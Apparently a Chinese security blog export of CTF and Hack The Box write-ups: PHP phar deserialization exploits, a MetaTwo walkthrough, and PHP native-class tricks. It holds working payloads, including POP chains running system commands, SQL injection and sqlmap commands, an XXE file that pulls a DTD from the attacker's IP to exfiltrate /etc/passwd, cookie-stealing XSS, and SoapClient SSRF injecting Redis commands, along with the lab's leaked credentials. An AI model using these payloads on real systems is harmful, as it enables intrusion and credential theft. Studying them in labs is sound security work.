Phar 写操作\n$tttang->setMetadata($a);//自定义的meta-data存入manifest\n$tttang->setStub(\"&lt;?php __HALT_COMPILER();?>\");//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测\n$tttang->addFromString(\"test.txt\",\" \");//添加要压缩的文件\n$tttang->stopBuffering();//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘\n?>\n\n但是我用这个打失败了，并且发现 download 这个包抓不到，所以应该是要换思路了。\n发现 delete.php User 类的 __destruct() 魔术方法也同样调用了 close() 方法，和 Java 反射的思想差不多，这里把 $db 修改成 File 类即可攻击，构造 EXP，中间需要用 FileList 这个类来过渡，因为这里需要最后输出结果用，只是用 File 类的话是没办法把 flag 在前端打印出来的。\n&lt;?php\nclass User &#123;\n    public $db;\n    public function __construct() &#123;\n        $this->db = new Filelist();\n    &#125;\n&#125;\nclass FileList&#123;\n    private $files;\n    public function __construct()&#123;\n        $this -> files = array(new File());\n    &#125;\n&#125;\nclass File &#123;\n    public $filename = '/flag.txt';\n&#125;\n$a = new User();\n$phar = new Phar('poc.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'test');\n$phar->setStub('&lt;?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a);\n$phar->stopBuffering();\nrename('poc.phar','poc.gif');\n?>\n\n然后 delete 的功能点直接利用\n\n\n[NSSRound#4 SWPU]1zweb\n不太舒服，因为要自己编辑 PHP 文件，先读取文件\n\n最后整理出来的源码如下\nindex.php\n#index.php\n&lt;?php\nclass LoveNss&#123;\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct()&#123;\n        $this->ljt=\"ljt\";\n        $this->dky=\"dky\";\n        phpinfo();\n    &#125;\n    public function __destruct()&#123;\n        if($this->ljt===\"Misc\"&amp;&amp;$this->dky===\"Re\")\n            eval($this->cmd);\n    &#125;\n    public function __wakeup()&#123;\n        $this->ljt=\"Re\";\n        $this->dky=\"Misc\";\n    &#125;\n&#125;\n$file=$_POST['file'];\nif(isset($_POST['file']))&#123;\n    echo file_get_contents($file);\n&#125;\n\nupload.php\n#upload.php\n&lt;?php\nif ($_FILES[\"file\"][\"error\"] > 0)&#123;\n    echo \"上传异常\";\n&#125;\nelse&#123;\n    $allowedExts = array(\"gif\", \"jpeg\", \"jpg\", \"png\");\n    $temp = explode(\".\", $_FILES[\"file\"][\"name\"]);\n    $extension = end($temp);\n    if (($_FILES[\"file\"][\"size\"] &amp;&amp; in_array($extension, $allowedExts)))&#123;\n        $content=file_get_contents($_FILES[\"file\"][\"tmp_name\"]);\n        $pos = strpos($content, \"__HALT_COMPILER();\");\n        if(gettype($pos)===\"integer\")&#123;\n            echo \"ltj一眼就发现了phar\";\n        &#125;else&#123;\n            if (file_exists(\"./upload/\" . $_FILES[\"file\"][\"name\"]))&#123;\n                echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在\";\n            &#125;else&#123;\n                $myfile = fopen(\"./upload/\".$_FILES[\"file\"][\"name\"], \"w\");\n                fwrite($myfile, $content);\n                fclose($myfile);\n                echo \"上传成功 ./upload/\".$_FILES[\"file\"][\"name\"];\n            &#125;\n        &#125;\n    &#125;else&#123;\n        echo \"dky不喜欢这个文件 .\".$extension;\n    &#125;\n&#125;\n\n大致就是，要检查后缀并检查内容，且会检查 phar 文件的内容，这一步其实很容易 bypass，通过前面讲的，gzip 压缩就好。\n接着分析题目，先写 EXP\n&lt;?php\nclass LoveNss&#123;\n    public $ljt;\n    public $dky;\n    public $cmd;\n    public function __construct()&#123;\n        $this->ljt=\"Misc\";\n        $this->dky=\"Re\";\n        $this->cmd=\"system('cat /flag');\";\n    &#125;\n&#125;\n$phar = new Phar('poc.phar');\n$phar->startBuffering();\n$phar->setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ? >');\n$a = new LoveNss();\n$phar->setMetadata($a);\n$phar->addFromString('test.txt', 'test');\n$phar->stopBuffering();\n?>\n\n这里很明显要 bypass __wakeup() 魔术方法，但是如果只是修改内容是不行的，还需要修改签名，这就是前面说的内容。\n总的来说就是以下四步\n1、更改属性值来绕过 __wakeup 函数\n2、更改签名\n2、进行 gzip 压缩来绕过关键字检测\n4、更改文件后缀\n\nsign.py\nimport gzip\nfrom hashlib import sha1\nwith open('poc.phar', 'rb') as file:\n    f = file.read()\ns = f[:-28] # 获取要签名的数据\ns = s.replace(b'3:&#123;', b'4:&#123;')#更换属性值，绕过__wakeup\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB)\n#print(newf)\nnewf = gzip.compress(newf) #对Phar文件进行gzip压缩\nwith open('newPoc.png', 'wb') as file:#更改文件后缀\n    file.write(newf)\n\n构造完毕之后，上传并攻击\n\n\n0x05 小结总体感受下来 phar 的攻击面还是有点窄，不太好打\n0x06 Refhttps://quan9i.github.io/post/PHP%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/\n","categories":["PHP"],"tags":["PHP"]},{"title":"HTB Machine MetaTwo","url":"/2023/04/08/HTB-Machine-MetaTwo/","content":"HTB 靶机 MetaTwo 学习记录\n\n\n外网打点拿到目标 IP，先 nmap 扫，发现开了 80 端口\n\n\n设置 hosts，添加如下\n10.10.11.186 metapress.htb\n\n成功访问 80 端口，能够看到这其实是一个用 WordPress 搭建的网站，直接用 kali 自带的 wpscan 扫描\n\n\n比较有用的信息有信息泄露，以及 WordPress 版本，这里可以看到版本是 5.6.2，以及一些其他的可用信息，因为洞很多，所以这里肯定需要我们手动探测去思考一下最有可能被我们利用的是哪个漏洞，这里我看到 /events 目录下能够预定会议，感觉应该就是这里了，SQL 注入的洞。\n但是当时探测了很久都没打通，通过扫描 /events 目录发现了 booking press 框架，版本为 1.0.10，通过搜索发现，这个框架版本有 sql 注入的漏洞 https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357\n根据漏洞描述，这里需要加入一个 wpnonce 字段，而这一字段我们是可以直接从源代码里面找的，我这里的是 c290c8df1f\n\n\npayload 如下\ncurl -i &#39;http:&#x2F;&#x2F;metapress.htb&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;bookingpress_front_get_category_services&amp;_wpnonce&#x3D;c290c8df1f&amp;category_id&#x3D;33&amp;total_service&#x3D;-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;\n\n这里成功的将数据库版本等信息打出来了\n\n\nSQL 注入三步走，爆数据库为 blog\ncurl -i &#39;http:&#x2F;&#x2F;metapress.htb&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;bookingpress_front_get_category_services&amp;_wpnonce&#x3D;c290c8df1f&amp;category_id&#x3D;33&amp;total_service&#x3D;-7502) UNION ALL SELECT @@version,database(),@@version_compile_os,1,2,3,4,5,6-- -&#39;\n\n\n\n将这个数据包保存下来，然后用 sqlmap 去跑，当然用 curl 也可以\ncurl -i &#39;http:&#x2F;&#x2F;metapress.htb&#x2F;wp-admin&#x2F;admin-ajax.php&#39; --data &#39;action&#x3D;b\nookingpress_front_get_category_services&amp;_wpnonce&#x3D;eef86ae8b3&amp;category_id&#x3D;33&amp;total_service&#x3D;-7502) UNION ALL SELECT (group_\nconcat(tablE_nAme)),@@version_comment,@@version_compile_os,1,2,3,4,5,6 frOm&#x2F;**&#x2F;infOrmation_schEma.tablEs&#x2F;**&#x2F;whEre&#x2F;**&#x2F;tab\nle_schema&#x3D;databAse()-- -&#39;\n\nadmin.req\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: metapress.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 185\nOrigin: http://metapress.htb\nConnection: close\nReferer: http://metapress.htb/events/\nCookie: PHPSESSID=fmrrt38nv1pv286683fi2pa28l\n\naction=bookingpress_front_get_category_services&amp;_wpnonce=c290c8df1f&amp;category_id=33&amp;total_service=1\n\n命令行如下爆库\nsqlmap -r admin.req -p total_service --dbs\n\n爆表\nsqlmap -r admin.req -p total_service -D blog --tables\n\n主要看一下 wp_user 里面放了什么，爆列\n\n\nsqlmap -r admin.req -p total_service -D blog -T wp_users --columns\n\n\n\n后续就是爆内容，这一步的爆内容我感觉要很久，所以就直接把结果贴在这边了\nadmin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. \nmanager $P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70\n\n通过 john 爆破一下\njohn -w=/usr/share/wordlists/rockyou.txt hash\n\n只能爆破出 manager 的密码\nmanager:partylikearockstar\n\n这个密码肯定是用来登录 web 端后台页面的，所以去到默认接口 /wp-login.php，登录成功\n\n\n进去之后就还是那个问题，这个洞它不顶用啊，拿不到 shell，且目前我们已知的信息和 wp-scan 给我们的信息是一样的，WordPress 版本 v5.6.2，一般挖洞的时候会说最好 RCE，退而求其次 SSRF，实在不行 XXE\n因为这里有个文件上传的功能点，猜测应该是一个 xxe 的洞，而 WordPress v5.6.2 就存在一个 XXE 的漏洞\nhttps:&#x2F;&#x2F;www.acunetix.com&#x2F;vulnerabilities&#x2F;web&#x2F;wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2&#x2F;\n\n这里的 payload 不是很明白为什么要用 .wav 的文件打，把恶意内容写进 payload.wav\necho -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?>&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.16.17:9001/dedsec.dtd'\"'\"'>%remote;%init;%trick;]>\\x00' > payload.wav\n\n编辑 dedsec.dtd\n&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.XX.XX:9001/?p=%file;'>\" >\n\n一上传文件就会发起请求，触发 xxe，我们再通过起的 web 服务可以查看文件内容\nphp -S 0.0.0.1:9001\n\n\n\n将内容 base64 解码一下\n\n\n发现 XXE 能够打通，且发现了一个用户名为 jnelson 的用户\njnelson:x:1000:1000:jnelson,,,:&#x2F;home&#x2F;jnelson:&#x2F;bin&#x2F;bash\n\n内网横移那这里要怎么去获得 jnelson 的 password 就成为了很大的一个难点，如果是普通的 CTF 题目应该直接读 flag 就可以了，这里实在是读不到什么有用的信息，所以只能再读取一下其他信息。\n已知后端用的中间件是 Nginx，这里应该可以先拿到根目录的位置，然后再根据根目录去读取 WordPress 的一些配置文件，例如 wp-config.php 这种类型的文件，里面应该保存了数据库的信息，这样一来的话我们可能会有所进展。\nnginx 的默认配置文件在 /etc/nginx/sites-enabled/default，我们尝试读取一下\nserver &#123;\n\n\tlisten 80;\n\tlisten [::]:80;\n\n\troot /var/www/metapress.htb/blog;\n\n\tindex index.php index.html;\n\n        if ($http_host != \"metapress.htb\") &#123;\n                rewrite ^ http://metapress.htb/;\n        &#125;\n\n\tlocation / &#123;\n\t\ttry_files $uri $uri/ /index.php?$args;\n\t&#125;\n    \n\tlocation ~ \\.php$ &#123;\n\t\tinclude snippets/fastcgi-php.conf;\n\t\tfastcgi_pass unix:/var/run/php/php8.0-fpm.sock;\n\t&#125;\n\n\tlocation ~* \\.(js|css|png|jpg|jpeg|gif|ico|svg)$ &#123;\n\t\texpires max;\n\t\tlog_not_found off;\n\t&#125;\n\n&#125;\n\n\n已知根目录是 /var/www/metapress.htb/blog，尝试读取 /var/www/metapress.htb/blog/wp-config.php\nwp-config.php\n&lt;?php\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'blog' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'blog' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\ndefine( 'FS_METHOD', 'ftpext' );\ndefine( 'FTP_USER', 'metapress.htb' );\ndefine( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );\ndefine( 'FTP_HOST', 'ftp.metapress.htb' );\ndefine( 'FTP_BASE', 'blog/' );\ndefine( 'FTP_SSL', false );\n\n/**#@+\n * Authentication Unique Keys and Salts.\n * @since 2.6.0\n */\ndefine( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7&#125;`rXVG=3 n>+3m?.B/:' );\ndefine( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf&#123;=]a%' );\ndefine( 'LOGGED_IN_KEY',    'J+mxCaP4z&lt;g.6P^t`ziv>dd&#125;EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C&#123;qKXy' );\ndefine( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q&#123;^z(F?)7mxNUg986tQO7O5' );\ndefine( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s&#125;d&lt;&amp;M;.,x0z~R>3!D' );\ndefine( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );\ndefine( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw&#125;Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );\ndefine( 'NONCE_SALT',       '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#&#125;w!Bq,h&#125;V9jKSkTGsv%Y451F8L=bL' );\n\n/**\n * WordPress Database Table prefix.\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine( 'WP_DEBUG', false );\n\n/** Absolute path to the WordPress directory. */\nif ( ! defined( 'ABSPATH' ) ) &#123;\n\tdefine( 'ABSPATH', __DIR__ . '/' );\n&#125;\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n\n\nftp 账号密码为:\nmetapress.htb:9NYS_ii@FyL_p5M2NvJ\n\n成功脸上 ftp\nftp 10.10.11.186\n\n\n\n发现 mailer 里面有一个 send_email.php 文件，通过 get 命令传输到本机电脑上\nget send_email.php\n\n\n\n终于是成功拿到了 jnelson 的密码，这个密码应该是 ssh 的，我们尝试连一下，拿下！\n\n\n拿下！\n小结挺有意思的题目，先 SQL 注入拿到普通用户权限，然后在进去之后继续打点，最后拿 shell，太有意思了\n","categories":["HTB"],"tags":["HTB"]},{"title":"HTB Machine Soccer","url":"/2023/04/10/HTB-Machine-Soccer/","content":"HTB 靶机 Soccer 学习记录\n\n\n拿到 IP 10.10.11.194，扫出来一个 80 端口，一个 9091 端口\n\n","categories":["HTB"],"tags":["HTB"]},{"title":"PHP 原生类学习","url":"/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/","content":"PHP 原生类学习\n\n0x01 前言这些东西最开始都没有接触，趁着课余时间可以学习一下\n常遇到的几个 PHP 原生类有如下几个：\n\nError\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement\nSplFileObject\n\n0x02 使用 Error&#x2F;Exception 内置类进行 XSSError 内置类\n适用于 php7 版本\n在开启报错的情况下\n\nError类是 php 的一个内置类，用于自动自定义一个 Error，在 php7 的环境下可能会造成一个 xss 漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个 POP 链走到一半就走不通了，不如尝试利用这个来做一个 xss，其实我看到的还是有好一些 cms 会选择直接使用 echo &lt;Object&gt; 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo的时候）会触发 __toString  方法，这是一种挖洞的新思路。\n下面演示如何使用 Error 内置类来构造 XSS。\n测试代码：\n&lt;?php\n$a = unserialize($_GET['whoami']);\necho $a;\n?>\n\n这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类，这就遇到了一个反序列化但没有 POP 链的情况，所以只能找到 PHP 内置类来进行反序列化\n给出 POC：\n&lt;?php\n$a = new Error(\"&lt;script>alert('xss')&lt;/script>\");\n$b = serialize($a);\necho urlencode($b);\n?>\n\n\n\n成功执行了 XSS\nException 内置类\n适用于 php5、7版本\n开启报错的情况下\n\n测试代码：\n&lt;?php\n$a = unserialize($_GET['whoami']);\necho $a;\n?>\n\nPOC：\n&lt;?php\n$a = new Exception(\"&lt;script>alert('xss')&lt;/script>\");\n$b = serialize($a);\necho urlencode($b);  \n?>\n\n\n\n[BJDCTF 2nd] xss 之光\n好像 buu 把这道题目下了，不知道为啥，简单跟着文章复现一下\n\n进入题目，首先通过git泄露拿到源码：\n&lt;?php\n$a = $_GET['yds_is_so_beautiful'];\necho unserialize($a);\n\n仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有 POP 链的情况，所以只能找到 PHP 内置类来进行反序列化。又发现有个 echo，没得跑了，就是我们刚才演示的利用 Error 或 Exception 内置类进行 XSS，但是查看一下题目的环境发现是 PHP 5，所以我们要使用 Exception 类。\n由于此题是 xss，所以只要 xss 执行 window.open() 就能把 flag 带出来，所以 POC 如下：\n&lt;?php\n$poc = new Exception(\"&lt;script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script>\");\necho urlencode(serialize($poc));\n?>\n\n执行后，得到 flag 就在 cookie 中：\n\n\n\n这里我们其实可以跟进去看一下 Error 类和 Exception 类的一些代码\n\n先看 Error 类的构造函数，其中我们可以看到构造函数中有一个 message 变量，这个变量是我们可控的，且在反序列化的时候如果是 XSS 的语句，可以直接拼接，造成 XSS 的效果。\n\n\n再看一下 Exception 类的构造函数，也是同样的道理\n\n\n\n那么由此思考其实可能还有更多的原生类也可能存在 XSS 的风险。\n\n0x03 使用 Error&#x2F;Exception 内置类绕过哈希比较在上文中，我们已经认识了 Error 和 Exception 这两个 PHP 内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过 md5() 函数和 sha1() 函数的比较。这里我们就要详细的说一下这个两个错误类了。\nError 类Error 是所有 PHP 内部错误类的基类，该类是在 PHP 7.0.0 中开始引入的。\n类摘要：\nError implements Throwable &#123;\n    /* 属性 */\n    protected string $message ;\n    protected int $code ;\n    protected string $file ;\n    protected int $line ;\n    /* 方法 */\n    public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null )\n    final public getMessage ( ) : string\n    final public getPrevious ( ) : Throwable\n    final public getCode ( ) : mixed\n    final public getFile ( ) : string\n    final public getLine ( ) : int\n    final public getTrace ( ) : array\n    final public getTraceAsString ( ) : string\n    public __toString ( ) : string\n    final private __clone ( ) : void\n&#125;\n\n类属性：\n\nmessage：错误消息内容\ncode：错误代码\nfile：抛出错误的文件名\nline：抛出错误在该文件中的行数\n\n类方法：\n\nError::__construct — 初始化 error 对象\nError::getMessage — 获取错误信息\nError::getPrevious — 返回先前的 Throwable\nError::getCode — 获取错误代码\nError::getFile — 获取错误发生时的文件\nError::getLine — 获取错误发生时的行号\nError::getTrace — 获取调用栈（stack trace）\nError::getTraceAsString — 获取字符串形式的调用栈（stack trace）\nError::__toString — error 的字符串表达\nError::__clone — 克隆 error\n\nException 类Exception 是所有异常的基类，该类是在 PHP 5.0.0 中开始引入的。\n类摘要：\nException &#123;\n    /* 属性 */\n    protected string $message ;\n    protected int $code ;\n    protected string $file ;\n    protected int $line ;\n    /* 方法 */\n    public __construct ( string $message = \"\" , int $code = 0 , Throwable $previous = null )\n    final public getMessage ( ) : string\n    final public getPrevious ( ) : Throwable\n    final public getCode ( ) : mixed\n    final public getFile ( ) : string\n    final public getLine ( ) : int\n    final public getTrace ( ) : array\n    final public getTraceAsString ( ) : string\n    public __toString ( ) : string\n    final private __clone ( ) : void\n&#125;\n\n类属性：\n\nmessage：异常消息内容\ncode：异常代码\nfile：抛出异常的文件名\nline：抛出异常在该文件中的行号\n\n类方法：\n\nException::__construct — 异常构造函数\nException::getMessage — 获取异常消息内容\nException::getPrevious — 返回异常链中的前一个异常\nException::getCode — 获取异常代码\nException::getFile — 创建异常时的程序文件名称\nException::getLine — 获取创建的异常所在文件中的行号\nException::getTrace — 获取异常追踪信息\nException::getTraceAsString — 获取字符串类型的异常追踪信息\nException::__toString — 将异常对象转换为字符串\nException::__clone — 异常克隆\n\n我们可以看到，在 Error 和 Exception 这两个 PHP 原生类中内只有  __toString 方法，这个方法用于将异常或错误对象转换为字符串。\n我们以 Error 为例，我们看看当触发他的 __toString 方法时会发生什么：\n&lt;?php\n$a = new Error(\"payload\",1);\necho $a;\n\n输出如下：\n\n\n发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 Error(&quot;payload&quot;,1) 中的错误代码“1”则没有输出出来。\n在来看看下一个例子：\n&lt;?php\n$a = new Error(\"payload\",1);\n$b = new Error(\"payload\",2);\necho $a;\necho \"&lt;br>\";\necho $b;\n\n输出如下\n\n\n可见，$a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 __toString 返回的数据包含当前行号。\nException 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。\nError 和 Exception 类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。\n[2020 极客大挑战] Greatphp[题目链接)](https://buuoj.cn/challenges#[极客大挑战 2020]Greatphp)\n进入题目，看到源码：\n&lt;?php\nerror_reporting(0);\nclass SYCLOVER &#123;\n    public $syc;\n    public $lover;\n\n    public function __wakeup()&#123;\n        if( ($this->syc != $this->lover) &amp;&amp; (md5($this->syc) === md5($this->lover)) &amp;&amp; (sha1($this->syc)=== sha1($this->lover)) )&#123;\n           if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match))&#123;\n               eval($this->syc);\n           &#125; else &#123;\n               die(\"Try Hard !!\");\n           &#125;\n           \n        &#125;\n    &#125;\n&#125;\n\nif (isset($_GET['great']))&#123;\n    unserialize($_GET['great']);\n&#125; else &#123;\n    highlight_file(__FILE__);\n&#125;\n\n?>\n\n要绕过 if 的判断才能进入到 eval() 的代码逻辑，这里的考点是 md5() 和 sha1() 可以对一个类进行 hash，并且会触发这个类的 __toString 方法；且当 eval() 函数传入一个类对象时，也会触发这个类里的 __toString 方法。\n根据刚才讲的 Error 类和 Exception 类中 __toString 方法的特性，我们可以用这两个内置类进行绕过。\n由于题目用 preg_match 过滤了小括号无法调用函数，所以我们尝试直接 include &quot;/flag&quot; 将 flag 包含进来即可。由于过滤了引号，我们直接用 url 取反绕过即可。\nPOC 如下：\n&lt;?php\n\nclass SYCLOVER &#123;\n    public $syc;\n    public $lover;\n    public function __wakeup()&#123;\n        if( ($this->syc != $this->lover) &amp;&amp; (md5($this->syc) === md5($this->lover)) &amp;&amp; (sha1($this->syc)=== sha1($this->lover)) )&#123;\n            if(!preg_match(\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match))&#123;\n                eval($this->syc);\n            &#125; else &#123;\n                die(\"Try Hard !!\");\n            &#125;\n\n        &#125;\n    &#125;\n&#125;\n$cmd = '/flag';\n$s = urlencode(~$cmd);\n$str = \"?>&lt;?=include~\".urldecode($s).\"?>\";\necho $str;\n\n$a=new Error($str,1);$b=new Error($str,2);\n$c = new SYCLOVER();\n$c->syc = $a;\n$c->lover = $b;\necho(urlencode(serialize($c)));\n\n?>\n\n这里 $str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;; 中为什么要在前面加上一个 ?&gt; 呢？因为 Exception 类与 Error 的 __toString 方法在 eval() 函数中输出的结果是不可控的，即输出的报错信息中，payload 前面还有一段杂乱信息“Error: ”：\nError: payload in /usercode/file.php:2\nStack trace:\n#0 &#123;main&#125;\n\n进入 eval() 函数会类似于：eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)。所以我们要用 ?&gt; 来闭合一下，即 eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)，这样我们的 payload 便能顺利执行了。我们可以写一段测试代码来确定这样子的闭合是有效的\n\n\n接着直接拼接即可\n\n\n0x04 使用 SoapClient 类进行 SSRFSoapClient 类PHP 的内置类 SoapClient 是一个专门用来访问 Web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。\n类摘要如下：\nSoapClient &#123;\n    /* 方法 */\n    public __construct ( string|null $wsdl , array $options = [] )\n    public __call ( string $name , array $args ) : mixed\n    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null\n    public __getCookies ( ) : array\n    public __getFunctions ( ) : array|null\n    public __getLastRequest ( ) : string|null\n    public __getLastRequestHeaders ( ) : string|null\n    public __getLastResponse ( ) : string|null\n    public __getLastResponseHeaders ( ) : string|null\n    public __getTypes ( ) : array|null\n    public __setCookie ( string $name , string|null $value = null ) : void\n    public __setLocation ( string $location = \"\" ) : string|null\n    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool\n    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed\n&#125;\n\n可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n该类的构造函数如下：\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n\n\n第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。\n第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。\n\n使用 SoapClient 类进行 SSRF简易的 SSRF知道上述两个参数的含义后，就很容易构造出 SSRF 的利用 Payload 了。我们可以设置第一个参数为 null，然后第二个参数的 location 选项设置为 target_url\n&lt;?php\n$a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333'));\n$b = serialize($a);\necho $b;\n$c = unserialize($b);\n$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n?>\n\n需要先把 php.ini 开启 extension=soup\n\n\n成功触发 SSRF\n\n\n但是，由于它仅限于 HTTP&#x2F;HTTPS 协议，所以用处不是很大。而如果这里 HTTP 头部还存在 CRLF 漏洞的话，但我们则可以通过 SSRF + CRLF，插入任意的 HTTP 头。\nSSRF + CRLF 配合如下测试代码，我们在 HTTP 头中插入一个 cookie：\n&lt;?php\n$target = 'http://124.222.21.138:2333/';\n$a = new SoapClient(null,array('location' => $target, 'user_agent' => \"WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\", 'uri' => 'test'));\n$b = serialize($a);\necho $b;\n$c = unserialize($b);\n$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n?>\n\n执行代码后，如下图所示，成功在 HTTP 头中插入了一个我们自定义的 cookie：\n\n\nHTTP 协议打 Redis如下测试代码：\n&lt;?php\n$target = 'http://47.xxx.xxx.72:6379/';\n$poc = \"CONFIG SET dir /var/www/html\";\n$a = new SoapClient(null,array('location' => $target, 'uri' => 'hello^^'.$poc.'^^hello'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\n\\r\",$b); \necho $b;\n$c = unserialize($b);\n$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n?>\n\n执行代码后，如下图所示，成功插入了 Redis 命令：\n\n\n这样我们就可以利用HTTP协议去攻击Redis了。\n对于如何发送 POST 的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是 POST 数据 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type\n测试代码如下：\n&lt;?php\n$target = 'http://47.xxx.xxx.72:2333/';\n$post_data = 'data=whoami';\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\n    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'\n);\n$a = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\n\\r\",$b);\necho $b;\n$c = unserialize($b);\n$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n?>\n\n\n\n0x05 使用 DirectoryIterator 类绕过 open_basedirDirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。翻译过来就是文件枚举迭代器。\nDirectoryIterator 与 glob:// 协议结合将无视 open_basedir 